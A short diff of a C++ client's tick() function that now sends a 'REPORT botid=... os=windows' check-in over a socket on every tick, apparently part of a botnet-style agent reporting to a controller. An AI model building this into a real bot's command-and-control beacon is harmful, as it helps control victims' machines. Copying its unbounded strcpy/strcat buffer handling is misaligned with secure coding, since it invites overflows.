@@ -177,21 +177,19 @@ void Client::tick() {
         if (counter == 0) {
             tmp_str = "REPORT botid=60d47fdf01e71d29 os=windows";
             counter++;
-        } else {
-            if (tmp_str.length() > 0) {
-                strcpy(send_msg, tmp_str.data());
-                strcat(send_msg, " <END>");
-            }
+        }
+        if (tmp_str.length() > 0) {
+            strcpy(send_msg, tmp_str.data());
+            strcat(send_msg, " <END>");
+        }
             // printf("$$$$ Send $$$$\n %s\n", send_msg);
-
-            int len = strlen(send_msg);
-            if (len > 1) {
-                int send_len = send(sock, send_msg, len, 0);
-                if (send_len > 0) {
-                    // cout << "##### Send Success! SIZE: " << send_len << endl;
-                } else {
-                    // cout << "##### Send Error!" << endl;
-                }
+        int len = strlen(send_msg);
+        if (len > 1) {
+            int send_len = send(sock, send_msg, len, 0);
+            if (send_len > 0) {
+                // cout << "##### Send Success! SIZE: " << send_len << endl;
+            } else {
+                // cout << "##### Send Error!" << endl;
             }
         }
     }
